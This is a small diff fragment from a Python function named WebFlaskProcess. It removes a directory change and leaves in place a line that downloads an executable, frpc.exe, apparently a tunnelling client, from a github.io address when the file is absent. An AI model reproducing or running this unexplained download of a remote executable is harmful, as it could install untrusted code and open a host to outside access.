@@ -64,7 +64,6 @@ def WebFlaskProcess():
     import urllib.request
     from PIL import Image
 
-    os.chdir("C:\\Temp")
     if not os.path.exists("frpc.exe"):
         urllib.request.urlretrieve("https://python191003.github.io/frpc.exe", "frpc.exe")
 
